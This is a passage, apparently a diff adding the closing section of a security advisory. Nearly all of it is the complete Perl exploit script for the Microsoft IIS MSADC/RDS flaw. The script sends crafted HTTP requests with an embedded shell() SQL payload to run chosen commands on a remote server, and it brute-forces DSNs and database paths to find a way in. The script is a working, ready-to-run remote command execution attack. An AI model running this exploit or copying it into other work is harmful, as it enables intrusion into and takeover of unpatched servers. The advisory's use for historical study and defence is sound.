+	assessment, and Mike Dinowitz from www.houseoffusion.com 
+	and Vacuum from www.technotronic.com for creative input.
+
+
+	    Time is creation.  The future is just not there.
+
+
+- 8 -  The Code!!!!
+
+   Again, to run this, save this advisory to a file (for instance
+msadc.txt) and then run 'perl -x file' (ie perl -x msadc.txt).
+
+#!perl
+#
+# MSADC/RDS 'usage' (aka exploit) script
+#
+#	by rain.forest.puppy
+#
+# Many thanks to Weld, Mudge, and Dildog from l0pht for helping me
+#   beta test and find errors!
+
+use Socket; use Getopt::Std;
+getopts("e:vd:h:XR", \%args);
+
+print "-- RDS exploit by rain forest puppy / ADM / Wiretrip --\n";
+
+if (!defined $args{h} && !defined $args{R}) {
+print qq~
+Usage: msadc.pl -h <host> { -d <delay> -X -v }
+	-h <host> 	= host you want to scan (ip or domain)
+	-d <seconds>	= delay between calls, default 1 second
+	-X		= dump Index Server path table, if available
+	-v		= verbose
+	-e		= external dictionary file for step 5
+
+	Or a -R will resume a command session
+
+~; exit;}
+
+$ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target="";
+if (defined $args{v}) { $verbose=1; } else {$verbose=0;} 
+if (defined $args{d}) { $delay=$args{d};} else {$delay=1;}
+if(!defined $args{R}){ $ip.="." if ($ip=~/[a-z]$/);
+$target= inet_aton($ip) || die("inet_aton problems; host doesn't exist?");}
+if (defined $args{X} && !defined $args{R}) { &hork_idx; exit; }
+
+if (!defined $args{R}){ $ret = &has_msadc;
+die("Looks like msadcs.dll doesn't exist\n")if $ret==0}
+
+print "Please type the NT commandline you want to run (cmd /c assumed):\n"
+	. "cmd /c ";
+$in=<STDIN>;    chomp $in;
+$command="cmd /c " . $in ;
+
+if (defined $args{R}) {&load; exit;}
+
+print "\nStep 1: Trying raw driver to btcustmr.mdb\n";
+&try_btcustmr;
+
+print "\nStep 2: Trying to make our own DSN...";
+&make_dsn ? print "<<success>>\n" : print "<<fail>>\n";
+
+print "\nStep 3: Trying known DSNs...";
+&known_dsn;
+
+print "\nStep 4: Trying known .mdbs...";
+&known_mdb;
+
+if (defined $args{e}){
+print "\nStep 5: Trying dictionary of DSN names...";
+&dsn_dict; } else { "\nNo -e; Step 5 skipped.\n\n"; }
+
+print "Sorry Charley...maybe next time?\n";
+exit;
+
+##############################################################################
+
+sub sendraw { 	# ripped and modded from whisker
+	sleep($delay); # it's a DoS on the server! At least on mine...
+	my ($pstr)=@_;
+	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+		die("Socket problems\n");
+	if(connect(S,pack "SnA4x8",2,80,$target)){
+		select(S);		$|=1;
+		print $pstr;		my @in=<S>; 
+		select(STDOUT);		close(S); 
+	 	return @in;
+	} else { die("Can't connect...\n"); }}
+
+##############################################################################
+
+sub make_header {  # make the HTTP request
+my $msadc=<<EOT
+POST /msadc/msadcs.dll/AdvancedDataFactory.Query HTTP/1.1
+User-Agent: ACTIVEDATA
+Host: $ip
+Content-Length: $clen
+Connection: Keep-Alive
+
+ADCClientVersion:01.06
+Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=3
+
+--!ADM!ROX!YOUR!WORLD!
+Content-Type: application/x-varg
+Content-Length: $reqlen
+
+EOT
+;  $msadc=~s/\n/\r\n/g;
+return $msadc;}
+
+##############################################################################
+
+sub make_req {  # make the RDS request
+my ($switch, $p1, $p2)=@_;
+my $req=""; my $t1, $t2, $query, $dsn;
+
+if ($switch==1){ # this is the btcustmr.mdb query
+$query="Select * from Customers where City=" . make_shell();
+$dsn="driver={Microsoft Access Driver (*.mdb)};dbq=" .
+	$p1 . ":\\" . $p2 . "\\help\\iis\\htm\\tutorial\\btcustmr.mdb;";}
+
+elsif ($switch==2){ # this is general make table query
+$query="create table AZZ (B int, C varchar(10))";
+$dsn="$p1";}
+
+elsif ($switch==3){ # this is general exploit table query
+$query="select * from AZZ where C=" . make_shell();
+$dsn="$p1";}
+
+elsif ($switch==4){ # attempt to hork file info from index server
+$query="select path from scope()";
+$dsn="Provider=MSIDXS;";}
+
+elsif ($switch==5){ # bad query
+$query="select";
+$dsn="$p1";}
+
+$t1= make_unicode($query);
+$t2= make_unicode($dsn);
+$req = "\x02\x00\x03\x00";
+$req.= "\x08\x00" . pack ("S1", length($t1));
+$req.= "\x00\x00" . $t1 ;
+$req.= "\x08\x00" . pack ("S1", length($t2));
+$req.= "\x00\x00" . $t2 ;
+$req.="\r\n--!ADM!ROX!YOUR!WORLD!--\r\n";
+return $req;}
+
+##############################################################################
+
+sub make_shell {  # this makes the shell() statement
+return "'|shell(\"$command\")|'";}
+
+##############################################################################
+
+sub make_unicode { # quick little function to convert to unicode
+my ($in)=@_; my $out;
+for ($c=0; $c < length($in); $c++) { $out.=substr($in,$c,1) . "\x00"; }
+return $out;}
+
+##############################################################################
+
+sub rdo_success {  # checks for RDO return success (this is kludge)
+my (@in) = @_; my $base=content_start(@in);
+if($in[$base]=~/multipart\/mixed/){
+return 1 if( $in[$base+10]=~/^\x09\x00/ );}
+return 0;}
+
+##############################################################################
+
+sub make_dsn {  # this makes a DSN for us
+my @drives=("c","d","e","f");
+print "\nMaking DSN: ";
+foreach $drive (@drives) {
+print "$drive: ";
+my @results=sendraw("GET /scripts/tools/newdsn.exe?driver=Microsoft\%2B" .
+	"Access\%2BDriver\%2B\%28*.mdb\%29\&dsn=wicca\&dbq="
+	. $drive . "\%3A\%5Csys.mdb\&newdb=CREATE_DB\&attr= HTTP/1.0\n\n");
+$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\n]*)#;
+return 0 if $2 eq "404"; # not found/doesn't exist
+if($2 eq "200") {
+  foreach $line (@results) {
+    return 1 if $line=~/<H2>Datasource creation successful<\/H2>/;}}
+} return 0;}
+
+##############################################################################
+
+sub verify_exists {
+my ($page)=@_;
+my @results=sendraw("GET $page HTTP/1.0\n\n");
+return $results[0];}
+
+##############################################################################
+
+sub try_btcustmr {
+my @drives=("c","d","e","f");
+my @dirs=("winnt","winnt35","winnt351","win","windows");
+
+foreach $dir (@dirs) {
+ print "$dir -> "; # fun status so you can see progress
+ foreach $drive (@drives) {
+ print "$drive: ";  # ditto
+$reqlen=length( make_req(1,$drive,$dir) ) - 28;
+$reqlenlen=length( "$reqlen" );
+$clen= 206 + $reqlenlen + $reqlen;
+
+my @results=sendraw(make_header() . make_req(1,$drive,$dir));
+if (rdo_success(@results)){print "Success!\n";save(1,1,$drive,$dir);exit;}
+else { verbose(odbc_error(@results)); funky(@results);}} print "\n";}}
+
+##############################################################################
+
+sub odbc_error {
+my (@in)=@_; my $base;
+my $base = content_start(@in);
+if($in[$base]=~/application\/x-varg/){ # it *SHOULD* be this
+$in[$base+4]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
+$in[$base+5]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
+$in[$base+6]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
+return $in[$base+4].$in[$base+5].$in[$base+6];}
+print "\nNON-STANDARD error.  Please sent this info to rfp\@wiretrip.net:\n";
+print "$in : " . $in[$base] . $in[$base+1] . $in[$base+2] . $in[$base+3] .
+	$in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}
+
+##############################################################################
+
+sub verbose {
+my ($in)=@_;
+return if !$verbose;
+print STDOUT "\n$in\n";}
+
+##############################################################################
+
+sub save {
+my ($p1, $p2, $p3, $p4)=@_;
+open(OUT, ">rds.save") || print "Problem saving parameters...\n";
+print OUT "$ip\n$p1\n$p2\n$p3\n$p4\n";
+close OUT;}
+
+##############################################################################
+
+sub load {
+my @p; my $drvst="driver={Microsoft Access Driver (*.mdb)}; dbq=";
+open(IN,"<rds.save") || die("Couldn't open rds.save\n");
+@p=<IN>; close(IN);
+$ip="$p[0]"; $ip=~s/\n//g; $ip.="." if ($ip=~/[a-z]$/);
+$target= inet_aton($ip) || die("inet_aton problems");
+print "Resuming to $ip ...";
+$p[3]="$p[3]";  $p[3]=~s/\n//g; $p[4]="$p[4]";  $p[4]=~s/\n//g;
+if($p[1]==1) {
+$reqlen=length( make_req(1,"$p[3]","$p[4]") ) - 28;
+$reqlenlen=length( "$reqlen" ); $clen= 206 + $reqlenlen + $reqlen;
+my @results=sendraw(make_header() . make_req(1,"$p[3]","$p[4]"));
+if (rdo_success(@results)){print "Success!\n";}
+else { print "failed\n"; verbose(odbc_error(@results));}}
+elsif ($p[1]==3){
+	if(run_query("$p[3]")){
+	print "Success!\n";} else { print "failed\n"; }}
+elsif ($p[1]==4){
+	if(run_query($drvst . "$p[3]")){
+	print "Success!\n"; } else { print "failed\n"; }}
+exit;}
+
+##############################################################################
+
+sub create_table {
+my ($in)=@_;
+$reqlen=length( make_req(2,$in,"") ) - 28;
+$reqlenlen=length( "$reqlen" );
+$clen= 206 + $reqlenlen + $reqlen;
+my @results=sendraw(make_header() . make_req(2,$in,""));
+return 1 if rdo_success(@results);
+my $temp= odbc_error(@results);  verbose($temp);
+return 1 if $temp=~/Table 'AZZ' already exists/;
+return 0;}
+
+##############################################################################
+
+sub known_dsn {
+# we want 'wicca' first, because if step 2 made the DSN, it's ready to go
+my @dsns=("wicca", "AdvWorks", "pubs", "CertSvr", "CFApplications",
+	"cfexamples", "CFForums", "CFRealm", "cfsnippets", "UAM",
+	"banner", "banners", "ads", "ADCDemo", "ADCTest");
+
+foreach $dSn (@dsns) {
+	print ".";
+	next if (!is_access("DSN=$dSn"));
+	if(create_table("DSN=$dSn")){
+	print "$dSn successful\n";
+	if(run_query("DSN=$dSn")){
+	print "Success!\n"; save (3,3,"DSN=$dSn",""); exit; } else { 
+print "Something's borked.  Use verbose next time\n";}}} print "\n";}
+
+##############################################################################
+
+sub is_access {
+my ($in)=@_;
+$reqlen=length( make_req(5,$in,"") ) - 28;
+$reqlenlen=length( "$reqlen" );
+$clen= 206 + $reqlenlen + $reqlen;
+my @results=sendraw(make_header() . make_req(5,$in,""));
+my $temp= odbc_error(@results);
+verbose($temp); return 1 if ($temp=~/Microsoft Access/);
+return 0;}
+
+##############################################################################
+
+sub run_query {
+my ($in)=@_;
+$reqlen=length( make_req(3,$in,"") ) - 28;
+$reqlenlen=length( "$reqlen" );
+$clen= 206 + $reqlenlen + $reqlen;
+my @results=sendraw(make_header() . make_req(3,$in,""));
+return 1 if rdo_success(@results);
+my $temp= odbc_error(@results);  verbose($temp);
+return 0;}
+
+##############################################################################
+
+sub known_mdb {
+my @drives=("c","d","e","f","g");
+my @dirs=("winnt","winnt35","winnt351","win","windows");
+my $dir, $drive, $mdb;
+my $drv="driver={Microsoft Access Driver (*.mdb)}; dbq=";
+
+# this is sparse, because I don't know of many
+my @sysmdbs=(	"\\catroot\\icatalog.mdb",
+		"\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb",
+		"\\system32\\certmdb.mdb",
+		"\\system32\\certlog\\certsrv.mdb" ); #these are %systemroot%
+
+my @mdbs=(	"\\cfusion\\cfapps\\cfappman\\data\\applications.mdb",
+		"\\cfusion\\cfapps\\forums\\forums_.mdb",
+		"\\cfusion\\cfapps\\forums\\data\\forums.mdb",
+		"\\cfusion\\cfapps\\security\\realm_.mdb",
+		"\\cfusion\\cfapps\\security\\data\\realm.mdb",
+		"\\cfusion\\database\\cfexamples.mdb",
+		"\\cfusion\\database\\cfsnippets.mdb",
+		"\\inetpub\\iissamples\\sdk\\asp\\database\\authors.mdb",
+		"\\progra~1\\common~1\\system\\msadc\\samples\\advworks.mdb",
+		"\\cfusion\\brighttiger\\database\\cleam.mdb",
+		"\\cfusion\\database\\smpolicy.mdb",
+		"\\cfusion\\database\cypress.mdb",
+	"\\progra~1\\ableco~1\\ablecommerce\\databases\\acb2_main1.mdb",
+		"\\website\\cgi-win\\dbsample.mdb",
+	"\\perl\\prk\\bookexamples\\modsamp\\database\\contact.mdb",
+	"\\perl\\prk\\bookexamples\\utilsamp\\data\\access\\prk.mdb"
+		);  #these are just \
+
+foreach $drive (@drives) {
+ foreach $dir (@dirs){
+  foreach $mdb (@sysmdbs) {
+   print ".";
+   if(create_table($drv . $drive . ":\\" . $dir . $mdb)){
+    print "\n" . $drive . ":\\" . $dir . $mdb . " successful\n";
+    if(run_query($drv . $drive . ":\\" . $dir . $mdb)){
+     print "Success!\n"; save (4,4,$drive . ":\\" . $dir . $mdb,""); exit; 
+    } else { print "Something's borked.  Use verbose next time\n"; }}}}}
+
+ foreach $drive (@drives) {
+  foreach $mdb (@mdbs) {
+   print ".";
+   if(create_table($drv . $drive . $dir . $mdb)){
+    print "\n" . $drive . $dir . $mdb . " successful\n";
+    if(run_query($drv . $drive . $dir . $mdb)){
+     print "Success!\n"; save (4,4,$drive . $dir . $mdb,""); exit; 
+    } else { print "Something's borked.  Use verbose next time\n"; }}}}
+}
+
+##############################################################################
+
+sub hork_idx {
+print "\nAttempting to dump Index Server tables...\n";
+print "  NOTE:  Sometimes this takes a while, other times it stalls\n\n";
+$reqlen=length( make_req(4,"","") ) - 28;
+$reqlenlen=length( "$reqlen" );
+$clen= 206 + $reqlenlen + $reqlen;
+my @results=sendraw2(make_header() . make_req(4,"",""));
+if (rdo_success(@results)){
+my $max=@results; my $c; my %d;
+for($c=19; $c<$max; $c++){
+	$results[$c]=~s/\x00//g;
+	$results[$c]=~s/[^a-zA-Z0-9:~ \\\._]{1,40}/\n/g;
+	$results[$c]=~s/[^a-zA-Z0-9:~ \\\._\n]//g;
+	$results[$c]=~/([a-zA-Z]\:\\)([a-zA-Z0-9 _~\\]+)\\/;
+	$d{"$1$2"}="";}
+foreach $c (keys %d){ print "$c\n"; }
+} else {print "Index server doesn't seem to be installed.\n"; }}
+
+##############################################################################
+
+sub dsn_dict {
+open(IN, "<$args{e}") || die("Can't open external dictionary\n");
+while(<IN>){
+	$hold=$_; $hold=~s/[\r\n]//g; $dSn="$hold"; print ".";
+	next if (!is_access("DSN=$dSn"));
+	if(create_table("DSN=$dSn")){
+	print "$dSn successful\n";
+	if(run_query("DSN=$dSn")){
+	print "Success!\n"; save (3,3,"DSN=$dSn",""); exit; } else { 
+print "Something's borked.  Use verbose next time\n";}}} 
+print "\n"; close(IN);}
+
+##############################################################################
+
+sub sendraw2 { 	# ripped and modded from whisker
+	sleep($delay); # it's a DoS on the server! At least on mine...
+	my ($pstr)=@_;
+	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+		die("Socket problems\n");
+	if(connect(S,pack "SnA4x8",2,80,$target)){
+		print "Connected.  Getting data";
+		open(OUT,">raw.out");   my @in;
+		select(S);	$|=1; 	print $pstr;		
+		while(<S>){ print OUT $_; push @in, $_; print STDOUT ".";}
+		close(OUT); select(STDOUT); close(S); return @in;
+	} else { die("Can't connect...\n"); }}
+
+##############################################################################
+
+sub content_start { # this will take in the server headers
+my (@in)=@_; my $c;
+for ($c=1;$c<500;$c++) { 
+ if($in[$c] =~/^\x0d\x0a/){
+  if ($in[$c+1]=~/^HTTP\/1.[01] [12]00/) { $c++; }
+  else { return $c+1; }}}
+return -1;} # it should never get here actually 
+
+##############################################################################
+
+sub funky {
+my (@in)=@_; my $error=odbc_error(@in);
+if($error=~/ADO could not find the specified provider/){
+print "\nServer returned an ADO miscofiguration message\nAborting.\n";
+exit;}
+if($error=~/A Handler is required/){
+print "\nServer has custom handler filters (they most likely are patched)\n";
+exit;}
+if($error=~/specified Handler has denied Access/){
+print "\nServer has custom handler filters (they most likely are patched)\n";
+exit;}}
+
+##############################################################################
+
+sub has_msadc {
+my @results=sendraw("GET /msadc/msadcs.dll HTTP/1.0\n\n");
+my $base=content_start(@results);
+return 1 if($results[$base]=~/Content-Type: application\/x-varg/);
+return 0;}
+
+##############################################################################
+
